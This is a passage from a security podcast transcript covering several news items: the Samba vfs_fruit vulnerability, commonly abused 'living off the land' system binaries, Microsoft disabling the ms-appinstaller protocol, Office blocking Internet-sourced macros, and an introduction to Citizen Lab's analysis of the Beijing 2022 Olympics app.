And of course it's not only our phones; right?  Anything that's wireless, especially, I mean, I would be very circumspect about plugging anything into anything, either.  But Bluetooth and WiFi can be suspect.  The first step is to take the threat seriously.  It deserves to be taken seriously.  In the normal world, like just normal life, the actual likelihood of any individual being targeted is probably vanishingly small, as we say.  We don't want to overhype things because there are times when you really do need to pay attention.  But we've seen, you and I have talked about it, Leo, those maps of "cell towers," in air quotes, in Las Vegas weeks before and comparing them to during the Black Hat convention.  It would be funny to see how many new fake cell towers had suddenly appeared during Black Hat, if it weren't so frightening.  And of course those fake towers will be happy to field your connection.  They don't care who you are.  You're an opportunity, whoever you are. And the same has been true during each of the recent Olympic Games.  And it's sure to be so again this year, especially in China.



So this week's podcast is titled "The Inept Panda" because we're going to take a look at what Citizen Lab found when they deeply reverse engineered China's official and, interestingly, must-use app for the 2022 Winter Games.  But again, that's far from the only worry during the Games.



Okay.  So maybe this podcast will get to some people who may be saved from, you know, just by, again, raise your shields.  Be really careful.  Turn off any stuff you don't need.  Turn off Bluetooth.  Turn off WiFi if you don't really need it.  I would say free Internet is something you want to be very careful about.



So we have a serious CVSS 9.9 remote code execution vulnerability in SAMBA, and it impacts at least Red Hat, SUSE, and Ubuntu Linuxes running SAMBA prior to v4.13.17.  That's just been patched by its maintainers.  So that one is safe, 4.13.17.  Also patched were the other release flows 4.14.12 and 4.15.5.  Everyone using SAMBA is being urged to update to one of those three.  So, and you probably know if you are because it's not something that's running in Linux typically by default.  As far as I know.  I know that it's not running in FreeBSD.



LEO:  I think if you have file shares you're using, though, it's likely that you've using SAMBA.  Right?



STEVE:  Well, so would Linux assume that file shares would be sharing with Windows?  Because of course that's SAMBA's origin.



LEO:  I mean, there's other - there's CIFS, and there's Apple's system.



STEVE:  Right.  Well, CIFS was just an early version of SAMBA.



LEO:  SAMBA, right.  Yeah, SAMBA is an open version of SMB, the LAN manager.



STEVE:  Correct.  And in fact that's, yeah, exactly.  SAMBA got its name from SMB, you know, add an A after the first S and another one at the end.  So SMB turns into SAMBA.  And of course SMB stands for Server Message Blocks, which is the file and printer sharing protocol originally designed by Microsoft back in, as you said, the LANMAN era.  It was the original file and printer sharing protocol.  And unfortunately, I mean, it's good that it's still with us.  But that does mean that it's old and creaky and probably brings along a bunch of legacy baggage and probably an embodiment of legacy thinking.  I mean, that's really what's in a lot of these older protocols is just the way they were doing things back then.  I mean, this predated the Internet; right?  This was coax.  And when a network interface was, you know, the card was like $1,500 for, like, per workstation.  So, I mean, it was a whole different world.



Today SMB is in its third generation.  And it is what Windows still uses.  I have it running on all of my Unix machines since, as you said, Leo, it is so convenient to be able to use SMB to attach a Unix file system or Linux to Windows File Explorer and browse around in the nice Windows GUI and edit configuration files in a convenient Windows editor, all as if it was a local drive.  But as I said, SMB is an old and complex protocol with security added as an afterthought.  So you will never find it or any other overly complex protocol exposed to the public Internet by any of my servers, and I have said many times in the past nobody wants to have file and printer sharing open on the Internet.  Mistakes are just too easy to make.



And today we have another biggie.  In this case, the exploitation of this critical vulnerability would allow attackers to gain remote code execution with root privileges on any Linux servers offering this, or systems.  If you've got a SAMBA daemon running, then you're serving that protocol; right?  So any Linux machines offering the protocol.  The ability to execute remote code as a root user, as we know, means that an attacker would be able to read, modify, write, delete any files on the system, enumerate its users, install malware, you know, cryptominers, ransomware, and also pivot to gain access deeper into a corporate network.



So this bug is being tracked as CVE-2021-44142.  So it got numbered last year.  It's specifically an out-of-bounds heap read/write vulnerability appearing in the VFS, that's the virtual file system module, which is called "vfs_fruit."  Or just Fruit, for short.  And we'll see where it got its name in a second.  The vulnerability was used and disclosed by a pair of researchers from STAR Labs during the Pwn2Own Austin 2021 competition, which we covered last year.  After the event, researchers from Trend Micro's ZDI, who host the Pwn2Own, they took a look at it more closely and discovered additional variants of the vulnerability.



And our old friend Orange Tsai of DEVCORE - remember he's the one who started all of last year's Exchange Server debacle by showing Microsoft the first of what turned out to be a great many problems in Exchange Server's code.  Anyway, he had - assuming it's a he - had independently reported this problem directly to the SAMBA maintainers.  So it rates a 9.9, which we know is, you know, it's not a 10.0, but it's really close, because it's one of those no-authentication-needed exploits which can provide full root remote access if you happen to have this VFS Fruit module running.



Okay.  So what about that?  The Fruit module obtained its name due to the famous fruit-named company whose clients, yes, it was created to converse with.  Yes, that's right, the Fruit module that ships with SAMBA is designed to provide interoperability between SAMBA and Netatalk, with Netatalk being an open-source implementation of the AFP  Apple Filing Protocol  which is used to converse with macOS clients.  So when everything's in place and working, it allows Unix-like systems (Apple's) to serve as file servers for Apple devices.  Once a session is established, SMBD, which is the SMB daemon, allows an unauthenticated user to set extended file attributes.



And therein lies the problem.  It is in the ability to write extended file attributes over the Apple Filing Protocol enabled by the VFS Fruit module that allow - there is a heap overflow which allows you to then perform a buffer overflow and leverage that into execution.  So as always, the right solution is to update immediately to one of the releases that has been repaired.  If the Fruit module is not being used, then there's no vulnerability.  You don't have anything to worry about.  If it's present, but not actively needed, it can be removed from the SMB configuration and the SAMBA daemon restarted in order to get rid of it.  So you don't want it running.



If you have to have it, if you have to use it, first of all, I don't know why it would ever be exposed to the public Internet.  But things happen.  You definitely want to update SAMBA.  There's no question this thing will be instrumented, weaponized, and people will start scanning for it immediately.



Living Off the Land.  This is just my favorite term.  Really.  When bad guys gain some source of presence on a system, no matter how that may initially have happened, they then typically need some means of doing something, right, once they're there.  Either they need to arrange to obtain the tools they will need from some remote hosting server, or they need to use and abuse what's already present where they are.



The term, which as I said I really love, that the security industry has coined for the latter is known as "living off the land," meaning use what you've got, wherever you are, cleverly reusing an environment's existing crop of utilities to get up to some mischief.  The "living off the land" phrase has been shortened to LOL, and thus these already present - yeah, I know.  And thus these already present binaries, when used in this fashion, are known as LOLBins, phrased and written as a single word.



The obvious advantage to reusing a system's existing LOLBins for nefarious purposes is that they're already there.  They're trusted by the system.  They probably have the rights that they need.  And they're approved for use by whatever antimalware might be watching over the environment, trying to see what mischief is going on.  So going out and grabbing something remotely incurs the risk of tripping an alarm when something new is pulled across the environment's network.  And in tightly locked-down environments, application whitelisting might prevent an OS from running code that hasn't been signed with a valid digital certificate.  In such environments, LOLBins that have already been approved for use are often able to, for example, open and run untrusted and unsigned utilities.  They're trusted, so the presumption is anybody using them is trusted, and so they should have greater rights.



I recently encountered an analysis, assembled by the security firm Uptycs - which is spelled U-P-T-Y-C-S, Uptycs - of the most commonly used LOLBins, actually the top five, which they have seen employed to further subvert each of the top five for Windows, top five for Linux, and the top five for macOS.  In Windows, the well-known regsvr32.exe and the rundll32.exe utilities have recently experienced spiking levels of abuse, with both being used extensively by the Qbot and the IcedID backdoor malware over the course of the last year.  Similarly, bizarre as it might seem, the Loki and Agent Tesla spyware samples have been caught exploiting a vulnerability in Microsoft's Equation Editor, EQNEDT32.exe.  And of course the more power Microsoft has added to PowerShell over time, the more ways bad guys are finding to abuse it.



So Uptycs' top five LOLBins for Windows, in order of descending popularity, are number one, top, is PowerShell because, boy, if you get a hold of that, you can do a lot of damage.  Then we have MSHTA, Regsvr32, WMIC, and that equation editor.  So now we have PowerShell being a nearly perfect tool for adversaries looking to compromise a system.  It provides them with access to various Windows features which can be abused for downloading payloads, disabling Microsoft Defender and firewalls, executing fileless malware out of RAM and so on.  So, yeah.  You really want to keep PowerShell out of the bad guys' hands, if possible.



MSHTA is the Windows utility that executes Microsoft's HTML Applications with the file extension .hta or JavaScript and VBScript files.  Adversaries are able to leverage mshta.exe for proxy execution, that is, execution on their behalf, of malicious .hta files, JavaScript, and VBScript.  The infamous TrickBot malware, which we'll be hearing a lot about this hour, often used as a first-stage loader for ransomware and other payloads, has been leveraging mshta.exe for the past year.  So it is in active exploitation.



Regsvr32 is in third place, a Windows built-in utility.  Anyone who's done like serious work with Windows has probably been asked to use Regsvr32 to register a DLL with the system that then makes it available globally for other things to use.  Anyway, it's a built-in utility that can be used to register and unregister service DLLs.  Adversaries are able to abuse it to download scripts hosted on remote servers and execute it in memory.  Both the Dridex and TrickBot malware families have used Reg32 to facilitate their infection routines.



WMIC is part of the Windows Management Instrumentation, the WMI system.  WMIC is a command executive for WMI.  Like PowerShell, it's quite powerful and has comprehensive features that provide a handy set of capabilities for accessing local or remote Windows system components.  Once again, the Dridex malware leverages WMIC to execute rundll32 in the execution phase of its attack lifecycle, but adversaries may also abuse WMIC to - and I always want to say K-E-Y-M-O-U-S-E.



LEO:  Me, too.



STEVE:  To achieve execution, discovery, and lateral movement inside of networks.  And as I mentioned, that again, really odd, I think it was only 5% in their top five, but it made it into the top five, Microsoft's Equation Editor, EQNEDT32.exe.  It turns out that it is being used by Agent Tesla and the Loki malware to execute their arbitrary code.  So there's a flaw in there somewhere that they're able to leverage.  And of course it's not just Windows that has plenty of LOLBins.  Over on the Linux side, Uptycs' top five LOLBins are chattr, Wget, setfacl, crontab, and rm, which I got a kick out of.



This chattr function, as in Change Attribute, C-H-A-T-T-R, in Linux, is used to set and unset file attributes.  Adversaries use this for changing the permissions of the file system files or to make their dropped files immutable to prevent users from deleting them.  The self-propagating Kinsing malware uses this change attribute to change the permissions of SSH keys and password files in the defense-evasion phase of its attack lifecycle.



Linux's Wget function or command is so handy that I always have a Windows binary of it available for my own command line use.  It's just too handy to be without.  Unfortunately, the bad guys agree.  They use it, as I do, as a no-nonsense means for quickly downloading files from across the Internet.  Malware families like the Mirai botnet use Wget extensively to download the second stage of its malware.



Linux's setfacl, ACL as in Access Control List, is used, as you'd expect, to set, modify, or remove the access control lists which are used to control access to regular files and directories.  Once again, the Kinsing malware that seems to be all about permissions, uses setfacl to set executable permission on bin/chmod in the defense-evasion phase of its attack lifecycle.  And I'm wondering, I didn't dig into it any deeper, but chmod certainly already has its executable bit set because it's a command.  So maybe the normal chmod, the real one,  resides in a different executable directory, not underneath /bin.  And so this thing is naming itself chmod and sticking itself under /bin and then using setfacl to turn on the executable permission bit in order to be runnable.



And of course the ever-handy "set it and forget it" crontab command easily opens the cron table for editing the list of tasks to be scheduled to run at specified times and intervals on the system.  You know, it's very much like Windows Scheduler, sort of the same thing.  Many a malware has arranged to come back from the dead through the clever manipulation of crontab's time-delayed command execution.  In particular, cryptocurrency miners have been seen accessing cron entries to delete already-installed cron jobs, meaning get rid of the competition, and to install new cron jobs to keep themselves running.



And nothing says "erase your own footsteps" like "rm," Linux's short and sweet file removal command.  Many malware families, including the Mirai and Gafgyt IoT botnets, as well as many cryptocurrency miners, depend upon rm to self-destruct and delete their tracks.  And of course the most classic of all hacker tricks is to delete the log files which Linux and Unix systems are famous for creating.  And the macOS is not without its handy tools being abused by malware.  Uptycs lists the Mac's top five LOLBins as: openssl, curl, sqlite, killall, and funzip.



Being the original SSL and TLS development and testing platform, which we've talked about often, OpenSSL is literally the Swiss army knife of security and certificate management and manipulation.  I had the occasion to use it just the other day on one of my FreeBSD Unix servers, the new one that I was setting up to host our GitLab instance.  I needed to check that the new certificate chain I had installed was working correctly.  I didn't feel comfortable placing GRC's wildcard certificate on a new and not-yet-trusted server.  If that were to ever get loose, that certificate, it would allow someone, anyone, to spoof any GRC.com subdomain.  Not good.



So instead I asked DigiCert to make a certificate that would only be valid for the domain "dev.grc.com."  There's nothing else like OpenSSL for dumping and diagnosing secure connection setup.  Unfortunately, like any powerful tool, it can be just as powerful when in the hands of someone malicious.  On macOS, the Shlayer malware often leverages OpenSSL in conjunction with Base64, using both to encode and decode malware, also to encrypt malware, to hide it from detection.



We've talked about the clever abuse of the "curl" command several times in the past.  Being a longstanding command-line tool used for transferring data using various network protocols, and that's really where it shines, curl is much like Wget, although Wget, being short for "web get," has more of a web orientation and is able to do things like follow redirection chains which is beyond curl.  That said, curl is insanely more versatile with its protocol support.  It can be used to obtain data from servers that are offering the DICT, FILE protocols, FTP, FTPS, of course for SSL or TLS, GOPHER, GOPHERS, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET, or TFTP.  In other words, pretty much anything you can imagine you're able to use curl against.



And of interest to the bad guys, unfortunately, curl is designed to work without user interaction, so it's perfect for malicious scripting and remote unattended use.  So curl remains the go-to command for many users and scripts.  On macOS, it's also a favorite of the Bundlore malware which leverages curl to download payloads while it's busily setting up shop on a new machine.



SQLite, I was sort of surprised to see that.  That was number three for macOS of the top LOLBins.  Of course, SQLite is a transactional SQL database engine present in macOS and increasingly in other OSes as well.  I've got it on a bunch of mine.  For example, I guess I'm using Postgres on the new FreeBSD machine.  But anyway, it's often used to create databases that can be transported across machines.  The macOS, again, Bundlore malware uses SQLite to retrieve the history of downloaded files from the Internet in the exfiltration phase of its attack lifecycle.  And actually they probably mean the history of exfiltrated, like uploaded files.



Fourth on the list for macOS is killall, a handy utility also found on many Unix and Unix-like systems.  I use it.  When newsreading clients connect to GRC's newsgroup server, in typical Unix style, a new instance of a single client server is forked for each connected client.  So you end up with just a gazillion little processes, all running, each one talking to one  persistent user of the newsgroup server.  There have been many times when I have needed everyone to obtain an updated copy of some filter code which requires all instances of this client, typically hundreds of them because people tend to leave their newsreaders running, to be restarted and reloaded.



The only way to do that, short of rebooting the server, would be, well, and rebooting the server would be overkill, is to simply use Unix's killall command to terminate those hundreds of forked processes all at once.  Naturally, this nice command can often be put to nefarious use and macOS's Shlayer malware uses killall to kill the running script's terminal window after its bash script activity has been completed in a little bit of a kamikaze maneuver.



And, finally, the Mac's "funzip" utility, fifth of the top five,  is able to extract the contents of .zip and .gzip files directly to output from archives or other piped input.  Shlayer also uses it with the head and tail commands to extract a malicious binary with a password.  So living off the land, indeed.  All of those very handy commands are right there on our systems, which saves the bad guys from needing to bring them with.  And as I noted at the start, it's also far more stealthy to simply use what's already there.



LEO:  I'm going to have you stop for a moment.



STEVE:  I know, Leo, you're familiar with all of those.



LEO:  Yeah.  Oh, yeah, and I have it all running all the time.  By the way, I love your pronunciation.  When you said "SQLite," I thought, wait a minute, because I've always said "SQL Lite."  But then I found an interview with the creator of it, and he says it's pronounced like the mineral, ess-cue-ell-ite.  So anyway.



STEVE:  Okay.  So in one of those situations which just begs the question, "What could possibly go wrong?," Microsoft decided some time ago that it was old-fashioned for users to have to first download an installer package, then install it.  Wouldn't it be so much better to just let users install a new program directly from any website just by clicking on a link?  Like I said, "What could possibly go wrong?"



LEO:  What could possibly, possibly go wrong.



STEVE:  And as if in answer to that question, Microsoft has now completely disabled that handy-dandy facility after some very popular malware was overheard to comment:  "Hey! This is great!"  For the past three months the hard-to-get-rid-of Emotet gang, with their TrickBot - I told you we'd be hearing about Trickbot a lot - and the BazarLoader malware, has been using and abusing this new and very convenient protocol to deploy malware on users' systems.



Microsoft's page describing MSIX, which is what this is called, MSIX, explains that:  "MSIX is a Windows app package format" - it's actually four package formats - "that provides a modern packaging experience" - because that's what you want in your packaging is a modern experience - "to all Windows apps.  The MSIX package format preserves the functionality of existing app packages and/or install files in addition to enabling new, modern packaging" - we're talking about software - "packaging and deployment features to Win32, WPF, and Windows Forms apps.



"MSIX enables enterprises to stay current and ensure their applications are always up to date."  Right, you know, because no one wants an old version of TrickBot.  Anyway, "It allows IT Pros and developers to deliver a user-centric solution while still reducing the cost of ownership of applications by reducing the need to repackage."  So, what?



Okay.  To give us a better sense for what's going on here, I'll share Microsoft's three key feature bullet points.  First, reliability.  MSIX provides a reliable install, boasting, they say, a 99.96% success rate over millions of installs with a guaranteed uninstall.  That's handy for malware.  Network bandwidth optimization.  MSIX decreases the impact to network bandwidth through downloading only - and this is what they say - the 64K block, as if we're supposed to know what that means, but okay.  This is done by leveraging the AppxBlockMap.xml file contained in the MSIX app package.  And they have a reference later to that in the article.  MSIX, they said, is designed for modern systems and the cloud.



And the third point, disk space optimizations.  With MSIX there is no duplication of files across apps, and Windows manages the shared files across apps.  The apps are still independent of each other so updates will not impact other apps that share the file.  A clean uninstall is guaranteed, even if the platform manages shared files across apps.  And you know, if that sounds really familiar, it's because they tried this once before with something called DLLs.  What a mess that turned out to be.



LEO:  Oh, yeah.  Still.



STEVE:  Oh, lord.



LEO:  Turned out?  It's still.



STEVE:  I know.  Well, in fact that whole XSS, or SSX folder they have now, they call it the Windows Side by Side, SXS, it's huge.  And basically what they did was they said, okay, that was a bad idea, those DLLs.  So now we're just going to give every  app its own set so that no one, like they just completely abandoned that whole idea.  But I suppose their institutional memory has been lost, since all the folks who did that to us have since left Microsoft.  So we're going to go through this all over again.



In any event, Microsoft apparently realized that their traditional app installing system was inherently introducing a great deal of bloat and redundancy.  And of course now we have the cloud.  So rather than downloading a big blob that the OS's app installer will then open, look around in, dig around through, read and deal with, let's make that remote.  Let's create a new protocol that allows that bloated and redundancy-filled app install package to remain in the cloud on remote servers.



So now the use of a special scheme, you know, like HTTPS is a scheme, the use of a special scheme and file extension will establish an interactive session to the cloud that allows the installer running in the Windows client to first download only the installation manifest and then decide, based upon what it already has, only which additional components of the entire package it subsequently needs to ask for.  Okay.  Kind of sounds like, I mean, I can see where they went with this idea.  We got the cloud.  Let's not download a blob and only take a few pieces from it.  Let's just get what the blob contains and then decide what more we want.



And Microsoft really put a lot of time and effort into this.  This MSIX SDK is open source.  The whole thing.  The whole definition and project is open source.  And although it was designed for Windows 10, it's not restricted to Windows 10.  There's an MSIX Tech Community, and lots of additional resources.  That initial AppxBlockMap.xml package is a document that contains a list of the app's files along with indexes and cryptographic hashes for each block of data that's stored in the package.  The block map file itself is verified and secured with a digital signature when the package is signed.  The block map file allows MSIX packages to be downloaded and validated incrementally, and also works to support differential updates to the app files after they're installed.  I mean, this thing has everything.



Another file, AppxManifest.xml, is a package manifest document that contains the info the system needs to deploy, display, and update an MSIX app.  This info includes package identity, package dependencies, required capabilities, visual elements, and extensibility points, whatever those are.  Maybe you now get points for extensibility.  I don't know.



There's also an entire file and registry - get this - a file and registry virtualization layer which provides a means for an application to declare that some set of its files and registry entries should be visible to other apps, and those should persist after app uninstall.  Other files and registry entries are not visible to other apps and are removed on uninstall.  Wow.  Complicated much?  I mean, is it any wonder this whole system is getting kind of brittle and flaky feeling?  Anyway.



I mentioned there are four packaging formats.  Those are reflected in the four file extensions:  .msix, .msixbundle, .appx, and .appxbundle, some of which you may have seen.  I've seen them sometimes in PowerShell stuff that I've had to do.  So a huge amount of industry has been invested in this for Windows 10 and beyond.  And Microsoft has just been forced to switch off the remote install, which was the entire point, due to its continued abuse.



In late November last year, the operators of the Emotet malware botnet started abusing the remote ms-appinstaller scheme - that's the scheme, ms-appinstaller - links in attacks targeting enterprise users by sending emails which lured innocent victims to specially crafted websites.  These sites would claim to contain important documents that recipients needed to view, but for which they needed to install - wait for it - a PDF component which was missing.  This was often made more convincing by arranging to continue a preexisting email dialogue.



And remember last year when all this was happening we were wondering how attackers might benefit from those multiple Exchange vulnerabilities which allowed them to obtain previous emails.  Now we know.  They would make spoofing attacks far more convincing by picking up a dialogue where it left off.  Of course the dialogue that was left off was with the real individual at the other end of the email conversation, not the bad guys.



Anyway, the link provided for the PDF component would actually be an ms-appinstaller:// scheme that claimed to install an Adobe-signed file, but in reality it installed a version of TrickBot's BazarLoader malware, which is the beginning of the end for that system and probably everything it's hooked to.



Now of course this fancy new app packaging system has everything signed with cryptographic signatures.  I mean, like out the wazoo.  But that didn't stop the Emotet gang.  Microsoft was finally forced to completely disable this protocol after all this work went into it because the gang found a way to spoof all those signatures in MSIX-packaged files.  Those signatures appeared to be, to Windows, completely authentic.  And I'll just note that it is unclear to me how anything like that could be spoof-proof.  I mean, how are signatures being verified?  If third parties are able to sign their own packages, and they must somehow be able to do that, then what prevents any third party from being malicious?  Nothing.



Anyway, without having dug into this any more deeply, it appears that what happened is that Microsoft developed a technology that's too easy to use and abuse, and which cannot actually be usefully protected.  Last year they delivered a patch for this problem, tracked as CVE-2021-43890, back in December as one of the 67 things they fixed at that time in December's Patch Tuesday.  Except we now know that they didn't actually fix it, since attacks have continued to take place.  And it would seem to me that it's actually not feasible for them to fix it.



So no more remote install, which means that all existing ms-appinstaller:// links have just died, world-wide and enterprise-wide everywhere.  Microsoft wrote:  "If you utilize the ms-appinstaller protocol on your website, we recommend that you update the link to your application, removing ms-appinstaller:// so that the MSIX package or appinstaller file will be downloaded instead onto its user's machine."  Oh, just like in the old days.  "We recognize that this feature is critical for many enterprise organizations.  We're looking into introducing a Group Policy that would allow IT administrators to reenable the protocol and control usage of it within their organizations."  In other words, IT admins may eventually be able to reenable this for local app deployment.  But it sure looks like its use over the Internet is likely gone for good.



They've not said it's gone for good.  A lot of the press coverage that didn't look at this as closely said, oh, yeah, it's been temporarily disabled.  It's like, okay, well, let's see if it comes back.  Because again, as I said, I can't see the model which allows this to be done safely.  Apps are signed.  Over time they are trusted by - those signatures gain trust and reputation by the various Windows Defender and other things that are looking at them.



But the goal here is a targeted attack.  The idea with a signature on an app is that it's going to acquire a reputation.  The publisher gets a reputation which allows the publisher's stuff to be trusted.  Bad guys don't need that.  They're able to do, you know, like a single attack makes it worth any amount of overhead.  And it looks like this is one of the weaknesses of this system.  So anyway, I expect we're not going to see it again.  We'll see.



Soon Internet-sourced macros WILL NOT RUN - I had that in all caps - in Office apps.  And then I had to double-check my spelling of "hallelujah."  My god, Microsoft is slow to fix obvious problems which hurt their users.  For how long has it been painfully obvious to everyone else that allowing macros to run in Office documents received from the Internet was a really bad idea?  And I'll answer that question.  There's never been a time when it wasn't painfully obvious.  The inherent danger has always been clear.



Since the early 2000s, Microsoft has attempted to give unwitting users control over this by showing a mild and non-specific security warning in a toolbar at the top of the document.  It stated that "Some active content has been disabled," alongside a button labeled "Enable Content."  So, oh, it's been disabled?  I guess I press the Enable Content button to turn it back on again.  Yes.  How many people do you imagine clicked the button in order to get what they believed they needed?  What many got was a lot more than they bargained for.



Yesterday, in apparent reaction to a 20-years-delayed epiphany, Microsoft suddenly announced that, as of version 2203, starting with the Current Channel, the Preview, early this April, Access, Excel, PowerPoint, Visio, and Word would not - and I mean NOT, bold, caps - allow macro scripts to be enabled inside untrusted documents that had been downloaded over the Internet.  That's huge.  Not being able to enable, rather than merely being warned and told essentially to click "Enable," will make all the difference in thwarting spoofing attacks.  Microsoft said that at a future date to be determined, they also plan to make this same change to Office LTSC (the long-term servicing channel), Office 2021, 2019, 2016, and 2013.



So whereas before the bar said "Security Warning" with a yellow exclamation point, the new bar says "SECURITY RISK" in all caps with a red "X" and the further explanation:  "Microsoft has blocked macros from running because the source of this file is untrusted."  And there ain't no "I trust it."  There's a Learn More button which nobody wants to learn anything, so they're not going to push that.  It's like, oh, okay.  Well, I guess I'll see what this does without those macros, whatever they are.



Okay.  So this will, without question, put a serious kink in the capabilities of malware gangs who've been relying upon tricking users into enabling the execution of macro scripts as a way of permitting those scripts to install malware on their systems.  So as I said, hallelujah.  It's really going to make a huge difference.  And it's a bit odd to see Microsoft now confessing how bad it's always been.



In their announcement they wrote:  "For years" - yes, years - "Microsoft Office has shipped powerful automation capabilities called 'active content.'  The most common kind are macros.  While we provided a notification bar to warn users about these macros, users could still decide to enable the macros by clicking a button.  Bad actors send macros in Office files to end users who unknowingly enable them."  You know, because there's a button there.  Guess I should push it.  "Malicious payloads are delivered, and the impact can be severe" - yeah - "including malware, compromised identity, data loss, and remote access."



So Microsoft, you're just figuring this out now.  Okay.  But I'm not going to look a gift horse in the mouth.  Better late than never.  The logic tree gauntlet that macros will now need to run finally gives them the respect their power should have always commanded.  I mean, it's like this one, two, three, four, five, like a seven-stage "if" tree where you've got to take every branch correctly.  In the start box it says "User opens file with VBA macros & MOTW attribute."  Okay?  What's MOTW?  That stands for Mark of the Web, which is a flag Microsoft automatically tags files with when they've come from the Internet.  And I'm sure our listeners will have seen those pop-up warnings when Windows is aware that a file they're about to execute came from the Internet.  That's the Mark of the Web.  That's the sign of the devil, the mark of the web.



Now it also turns out that most of us have always been victims of the "tyranny of the default" since, believe it or not, there's always been a Group Policy setting named "Block macros from running in Office files from the Internet," which enterprises have been able to turn on.  But of course it's been off by default, despite the fact that Microsoft says that they recommend enabling this policy.  But are they going to do it?  No.  Now they say that, if you do, your organization won't be affected by this upcoming change in Office's default behavior.  Hopefully our IT admin listeners are already ahead of the curve.  They turned that on.  Nothing to see here.



The good news is across all of Office back to 2013, starting in April, this will be turned on.  Yay.  And again, how many times have we talked about Excel macros, PowerPoint macros, macros in any of this Office stuff, Word of course, doing bad stuff?  And it's funny because the thing you - the document that you receive, the bad guys will have set it up so that the page you're reading knows macros are turned off.  So it says, oh, in order to view the rest of this content, press that nice little button up there in the upper right.  And then we'll be able to get going here.  And of course people go, oh, and press it, and then they're in trouble.



So, and you seem fascinated by that chart, Leo.  I also zoomed in and read it carefully because, I mean, it's like, "Is document from a trusted location?"  Yes.  Then okay.  Macros enabled.  No.  Next.  "Is macro digitally signed & trusted publisher on the PC?"  Yes.  Okay, fine.  Macros enabled.  No.  Next.  "Cloud policy to block?"  And, I mean, and so on and so on and so on.  So yes, this is just - it's wonderful that this kind of power is being managed the way it should have been because so many people have been hurt.



Okay.  For many months, I guess unsurprisingly, I've been ignoring a continual stream of questions asking whether, and hopefully when, I would be offering Never11.  And Leo, I still remember the first time you heard the name Never10.



LEO:  Yeah.



STEVE:  You almost fell off your ball.  I loved that you got a big kick out of that.  Never10.  Anyway, Never 10's become a bit famous.  I think it has 3.5 million downloads, something like that.



LEO:  Wow, wow. 



STEVE:  And at the moment, none of my own systems qualify to move to Windows 11.  Actually, it turns out I just found a laptop that I have that does.  But we know that this whole qualifying for Windows 11 is a moving and totally arbitrary limitation.  Microsoft allows virtual machines to install Windows 11 without any complaint over any processor and without any TPM.  Windows 11 can run on anything.  There's even a registry key, remember?  The registry key which Microsoft created is named "AllowUpgradesWithUnsupportedTPMOrCPU."  It's in there.  So we're currently playing a game titled "We'd like to sell you some new hardware, so we're going to dangle Windows 11 in front of you and hope you bite."  But it's Windows 11 that bites, at least as it's currently being offered.



I'm not being overly curmudgeonly about this.  I listen to Paul and Mary Jo, both past Windows enthusiasts, every week scratching their heads and bemoaning in bewilderment what Microsoft is thinking with all of this.  They just, it's like, it's just pretty funny to look at Paul just like, "Oh, Leo.  I don't know."  Anyway, now he's entertaining himself with Android and iOS and things because I think Windows is wearing a little thin.



Anyway, as for Windows 11, I think Microsoft is bound to eventually want all of us to move there.  Lord knows they were willing to do battle to get everyone moved up to 10.  So I predict that they'll eventually discover that Windows 11 is stable everywhere.  What do you know?  And they're going to want us all to move there.  But I really don't want that.  I don't want to go there until they put back a bunch of the features that they've taken away from Windows 10 which I like.  So I realized that I wanted a Never11 app for my own use.  And Lorrie certainly feels similarly.  She doesn't want anything to change, either.



Looking around the 'Net last week, I saw a huge mess.  There are Group Policy editor suggestions, which of course home users can't use because they don't have Group Policy editor.  There's a wide variety of and many weird registry edit instructions, always accompanied by the obligatory cautions about the danger of editing the registry.  And there are even sites instructing people to completely disable Windows Update, which we know is bad advice.  It turns out that at the beginning of last September Microsoft published an optional update, KB5005101, which adds to Windows Update the explicit ability to tell Windows Update to target a specific edition of Windows and to remain there, and maybe to target a specific version of Windows that's still to be determined.  Anyway, it is, of course, not enabled by default, but it's documented and honored.



So last Thursday evening I sent Mary Jo a note asking whether she knew whether the Enterprise editions of Windows would be subject to Microsoft's Windows 10-to-11 upgrade.  Mary Jo replied the next morning that she assumed not, but that she would place a formal request with Microsoft to ask.  And of course I was curious just to know whether it should be excluded or not.



So I worked on it last Friday.  And by the end of the evening I posted a test release of Never11 for GRC's newsgroup gang to play with.  Again, you know, I only did this because I knew it wasn't going to pull me away from SpinRite for long, and I had it done in less than a day.  Since then, I've been refining my ideas for what I want it to be.  I have an idea for something a bit more generic, with a different, yet still fun and memorable name.  But I have a few more experiments to run first.  I'm stealing time from SpinRite, which I want to be working on.  And so this will be a quickie, but I think it's important enough, and will help enough people, that it's worth a couple of days.  So I'll get it wrapped up and published shortly.  And I should have something new, fun, and useful to announce next week.



I think the best way for me to begin will be to introduce Citizen Lab, the group who have carefully examined the smartphone app that everyone  and I mean everyone  attending the Beijing 2022 Winter Olympics is required to install and use. We've spoken of Citizen Lab many times in the past as their work has popped up in the security space from time to time.  They're an interdisciplinary laboratory based at the Munk School of Global Affairs and Public Policy at the University of Toronto in Canada.  Their focus is research, development, and high-level strategic policy and legal engagement at the intersection of information and communication technologies, human rights, and global security.  So they seem to be well named.



They explain that they use a "mixed methods" approach to research combining practices from political science, law, computer science, and area studies with research which includes:  investigating digital espionage against civil society; documenting Internet filtering and other technologies and practices that impact freedom of expression online; analyzing privacy, security, and information controls for popular applications; and examining transparency and accountability mechanisms relevant to the relationship between corporations and state agencies regarding personal data and other surveillance activities.



So, you know, not really the EFF, but sort of a Canadian take on responsible citizenship on the Internet.  So they're perfect for this particular project, perfectly positioned to be interested in understanding the detailed operation of the smartphone app that all 2022 Olympic athletes and attendees and the press are being required to install and use.



So they begin their report with a bit of background to set the stage.  Here's what they said.  It's certainly useful.  They said:  "The 2022 Winter Olympic Games in Beijing have generated significant controversy.  As early as February 2021, over 180 human rights groups had called for governments to boycott the Olympics, arguing that holding the Games in Beijing will legitimize a regime currently engaging in genocide against Uyghur people in China.  Some governments, including Canada, the United Kingdom, and the United States, have pledged to diplomatically boycott the Games, meaning that these countries will allow athletes to compete at the Games, but will not send government delegates to attend the event.



"The International Olympic Committee (IOC), the organization responsible for organizing the Games, has been criticized for failing to uphold human rights.  In December 2021, the United States House of Representatives voted unanimously to condemn the IOC and stated that the IOC had violated," you know, and blah blah blah.  So lots of political controversy associated, unfortunately, with something that could use a lot less of that.



